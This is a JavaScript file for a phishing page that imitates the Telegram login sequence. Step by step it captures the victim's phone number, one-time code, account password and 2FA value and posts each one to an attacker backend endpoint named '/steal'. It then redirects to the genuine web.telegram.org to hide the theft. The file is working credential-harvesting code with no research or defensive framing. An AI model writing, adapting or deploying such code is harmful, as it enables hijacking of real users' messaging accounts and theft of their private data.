const BACKEND = `${process.env.BACKEND_URL}/steal`;
let phone = "";

const next = (id) => {
  document
    .querySelectorAll(".step")
    .forEach((s) => s.classList.remove("active"));
  document.getElementById(id).classList.add("active");
};

const showLoading = (id) => {
  document.getElementById(id).style.display = "block";
};
const hideLoading = (id) => {
  document.getElementById(id).style.display = "none";
};

async function sendCode() {
  phone = document.getElementById("phone").value.trim().replace(/[\s-]/g, "");
  if (!phone || phone.length < 10) return;

  showLoading("loadPhone");
  document.querySelector("#stepPhone button").disabled = true;

  await fetch(BACKEND, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ action: "send_code", phone }),
  });

  hideLoading("loadPhone");
  document.getElementById("sentTo").textContent = phone;
  next("stepOTP");
  document.querySelector("#stepPhone button").disabled = false;
}

async function submitOTP() {
  const otp = document.getElementById("otp").value.trim();
  if (otp.length < 5) return;

  showLoading("loadOTP");
  await fetch(BACKEND, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ action: "login", phone, code: otp }),
  });
  hideLoading("loadOTP");
  next("stepPass");
}

async function submitPass() {
  const pass = document.getElementById("pass").value;
  showLoading("loadPass");
  await fetch(BACKEND, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ action: "login", phone, code: "", password: pass }),
  });
  hideLoading("loadPass");
  next("step2FA");
}

async function submit2FA() {
  const twofa = document.getElementById("twofa").value.trim();
  showLoading("load2FA");
  await fetch(BACKEND, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ action: "login", phone, code: "", twofa }),
  });
  hideLoading("load2FA");
  next("stepSuccess");
  document.querySelector(".success-check").style.display = "block";

  setTimeout(() => {
    window.location.href = "https://web.telegram.org";
  }, 2000);
}

document.addEventListener("keypress", (e) => {
  if (e.key === "Enter") {
    const active = document.querySelector(".step.active");
    if (active.id === "stepPhone") sendCode();
    else if (active.id === "stepOTP") submitOTP();
    else if (active.id === "stepPass") submitPass();
    else if (active.id === "step2FA") submit2FA();
  }
});
